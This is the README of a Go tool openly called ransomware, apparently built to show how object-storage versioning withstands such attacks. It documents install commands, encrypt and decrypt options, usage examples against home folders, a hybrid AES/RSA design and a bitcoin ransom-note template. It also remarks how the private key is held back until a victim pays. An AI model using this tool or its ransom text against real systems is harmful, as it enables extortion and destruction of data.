# ransomware-example

A simple demonstration tool to simulate a ransomware attack locally

## ⚠️ Disclaimer ⚠️

This software is made just for demonstration and study purposes.
If you want to run it locally for tests, take care of what directories you decide to encrypt. The software is distributed in MIT license.
Its use is free, however the author doesn't take responsibility for any illegal use of the code by 3rd parties.

## Setup

To setup the tool just run

```bash
go install github.com/marmos91/ransomware@latest
```

### Setup locally

To run the tool locally without installing it

```bash
go run main.go
```

## Why

In order to demonstrate the way ransomware works quickly and in a protected environment, **it is very useful to be able to restrict its operation within a directory**.
This way the process takes much less time (the entire operating system does not need to be encrypted).
Writing this tool in Go, also **allows the tool to be developed even in a non-Windows environment** (by far the most supported operating system by ransomware available online)

## Demo

This project was used to showcase the resilience of [Cubbit](https://www.cubbit.io)'s object storage to this type of attack, demonstrating how it is possible to defend against such a tool using.
Cubbit's features ([versioning](https://docs.cubbit.io/guides/bucket-and-object-versioning), [object locking](https://docs.cubbit.io/guides/object-lock)).

The whole thing is available in a video demo that can be found [here](https://www.youtube.com/watch?v=w4vfng17eYg).

[![Watch the video](https://markdown-videos.vercel.app/youtube/w4vfng17eYg)](https://youtu.be/w4vfng17eYg)

The restore tool used in the demo is available [here](https://github.com/marmos91/s3restore).

## How to use it

This tool is used to simulate a ransomware attack. With it you can perform the following actions:

1. After setting up a key, recursively encrypt the contents of a specified path
2. After asking for a key, recursively decrypt the contents of a specified path

## Help

```bash
NAME:
   ransomware - A simple demonstration tool to simulate a ransomware attack

USAGE:
   ransomware [global options] command [command options] [arguments...]

VERSION:
   v1.0.0

AUTHOR:
   Marco Moschettini <marco.moschettini@cubbit.io>

COMMANDS:
   create-keys, c  Generates a new random keypair and saves it to a file
   encrypt, e      Encrypts a directory
   decrypt, d      Decrypts a directory
   help, h         Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --verbose      Runs the tool in verbose mode (more logs) (default: false)
   --help, -h     show help (default: false)
   --version, -v  print the version (default: false)
```

## Create a keypair

First thing you need to do is to create a keypair. You can do it by running

```bash
ransomware create-keys --path ~/Desktop
```

If you don't specifiy a path it will create the keys in `pwd`.
This command will create two files:

- pub.pem
- priv.pem

In a real scenario you need to put the `private key` in a server and provide it only after the victim payed the ransom. The public key needs instead to be embedded in the ransomware to encrypt the folders

## Encrypt a directory

With this command you can recursively encrypt every file inside a specified directory.

```bash
NAME:
   ransomware encrypt - Encrypts a directory

USAGE:
   ransomware encrypt [command options] [arguments...]

OPTIONS:
   --path value, -p value      Runs the tool on a directory
   --publicKey value           Loads the provided RSA public key in PEM format
   --extBlacklist value        the extension to blacklist (default: ".enc")
   --extWhitelist value        the extension to whitelist
   --skipHidden                skips hidden folders (default: false)
   --dryRun                    encrypts files without deleting originals (default: false)
   --encSuffix value           defines the suffix to add to encrypted files (default: ".enc")
   --addRansom                 if set to true add a ransom note to every encrypted folder (default: false)
   --ransomTemplatePath value  defines where to find the template to use for the ransom note
   --ransomFileName value      defines the name of the ransom file name (default: "IMPORTANT.txt")
   --bitcoinCount value        how many bitcoins to ask as ransom (default: 0)
   --bitcoinAddress value      the bitcoin address to use (default: "<bitcoin address>")
   --help, -h                  show help (default: false)
```

For example if you want to run the tool on the `~/Documents` folder run:

```bash
ransomware encrypt --publicKey ./pub.pem --path ~/Documents
```

This command provides the following options:

- `path`: the path to encrypt. This is required
- `publicKey`: the path of the publicKey PEM file created by the `create-keys` command
- `extBlacklist`: if provided, a comma-separated list of extension to skip. **This feature is useful, to exclude executable like `.exe` files**
- `extWhitelist`: if provided, a comma-separated list of extension to whitelist
- `skipHidden`: if set, skips hidden folders
- `dryRun`: just creates encrypted files without deleting originals
- `encSuffix`: defines a custom extension to set on encrypted files (default `.enc`)
- `addRansom`: if the tool should generate a new ransom.txt file for each encrypted folder
- `ransomTemplatePath`: the path of the template to use as ransom
- `ransomFileName`: the name to give to the ransom file
- `bitcoinCount`: how many bitcoin to ask as ransom
- `bitcoinAddress`: the bitcoin address to use inside the ransom file

### Examples

Just encrypt gif files on Desktop

```bash
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --extWhitelist .gif
```

Encrypt everything except `.csv` and `.pdf` files

```bash
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --extBlacklist .csv,.pdf
```

Encrypt everything and add a ransom file

```bash
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --addRansom --ransomTemplatePath ./ransom/IMPORTANT.txt
```

### Ransom file

This is an example of ransom file. The templated strings `{{.BitcoinAddress}}`, `{{.BitcoinCount}}` and `{{.PubliKey}}` will be replace by the script. Please check encrypt options to see options available

```txt
!!! IMPORTANT !!!

All of your files are encrypted with RSA 4096 and AES 256 ciphers.
More information about RSA and AES can be found here:
- https://en.wikipedia.org/wiki/RSA_(cryptosystem)
- https://en.wikipedia.org/wiki/Advanced_Encryption_Standard

Decrypting of your files is only possible with the private key and decrypt program, which is not available to you.
To receive your private key please send {{.BitcoinCount}}BTC to {{.BitcoinAddress}} together with the public key used to encrypt your files

The public key to use in the form is

{{.PublicKey}}
```

## Decrypt a directory

With this command you can decrypt a folder back to its original form after a victim payed the ransom

```bash
NAME:
   ransomware decrypt - Decrypts a directory

USAGE:
   ransomware decrypt [command options] [arguments...]

OPTIONS:
   --path value, -c value  Runs the tool on a directory
   --privateKey value      Loads the provided RSA private key in PEM format
   --dryRun                decrypts files without deleting encrypted versions (default: false)
   --encSuffix value       defines the suffix to add to encrypted files (default: ".enc")
   --ransomFileName value  defines the name of the ransom file name (default: "IMPORTANT.txt")
   --help, -h              show help (default: false)
```

For example if you want to run the tool on the `~/Documents` folder run:

```bash
ransomware decrypt --privateKey ./priv.pem --path ~/Desktop/toEncrypt
```

This command provides the following options:

- `path`: the path to encrypt. This is required
- `privateKey`: the path of the privateKey PEM file created by the `create-keys` command
- `dryRun`: just creates decrypted files without deleting encrypted version
- `encSuffix`: defines a custom extension for encrypted files (default `.enc`)
- `ransomFileName`: defines the name of the ransom file. Needed to delete the files previously generated

## How it works

The tool implements a [**hybrid encryption strategy**](<https://www.picussecurity.com/resource/the-most-common-ransomware-ttp-mitre-attck-t1486-data-encrypted-for-impact#:~:text=In%20the%20hybrid%20encryption%20approach,(public%20key)%20encryption%20algorithm.>) making use of two different algorithms:

- [AES256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
- [RSA2048](<https://en.wikipedia.org/wiki/RSA_(cryptosystem)>)

The reason for this choice is related to the different nature of the two encryption algorithms. **A hybrid approach takes advantage of the performance of AES to execute faster, while at the same time not providing the decryption key within the executable**.

A new random AES key is then generated for the session each time the tool is executed. **This key is used to encrypt all files in the selected folder**. For later retrieval, this key is **encrypted with the public RSA key provided** to the tool and prepended to all encrypted files.

In this way, the tool, provided with the corresponding private key, will be able to **read the AES key at the beginning of each file, decrypt it, and finally use it to decrypt the file**.
